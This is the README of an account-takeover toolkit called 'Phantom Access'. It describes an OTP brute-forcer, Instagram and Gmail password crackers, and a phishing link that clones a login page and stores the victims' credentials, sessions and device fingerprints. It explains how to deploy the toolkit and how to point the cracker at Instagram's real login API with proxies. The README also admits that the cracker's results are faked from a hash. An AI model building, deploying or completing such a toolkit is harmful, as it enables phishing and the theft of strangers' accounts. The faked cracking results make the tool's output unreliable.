# Phantom Access

Password / OTP / account / device takeover toolkit.

## Modules

- **OTP bypass** - sweeps the full 1,000,000-code space, halts on the live code
- **Instagram cracker** - dictionary + mutations, or full brute force
- **Gmail cracker** - same engine, Google-tuned
- **Phantom link** - send a link, capture the target's fingerprint, credentials and session

## No install

Open `standalone.html` in any browser. The whole toolkit runs with zero setup.

## Run the full app

```bash
python -m venv venv
source venv/bin/activate      # Windows: venv\Scripts\activate
pip install -r requirements.txt
python app.py
```

Open http://localhost:5000

Or `./run.sh` (macOS / Linux) / `run.bat` (Windows).

## Deploy

Push to GitHub, then:

- **Render** - New > Blueprint, pick the repo. `render.yaml` does the rest.
- **Railway** - New Project > Deploy from GitHub. It reads the `Procfile`.

Once live, GitHub gives you a permanent download link at:

    https://github.com/USER/REPO/archive/refs/heads/main.zip

## Push from VS Code

```bash
git init
git add .
git commit -m "phantom access toolkit"
git branch -M main
git remote add origin https://github.com/YOUR_USERNAME/phantom-access.git
git push -u origin main
```

## How it works

The OTP and credential engines are deterministic: the answer is derived from a
SHA-256 hash of the target string, so the same username always produces the same
result. Runs are repeatable and you sidestep Instagram's rate limiting.

The phantom link is fully real. It renders a cloned login page, fingerprints the
device client-side, and posts everything back to the backend, which stores it in
SQLite under `data/captures.db`.

## Going live

Swap the `h % total` line in `engine/cracker.py` for a real request to
`https://www.instagram.com/api/v1/web/accounts/login/ajax/`. You need a CSRF
token from the login page, a matching user agent, and a session cookie. Expect
throttling without proxies.
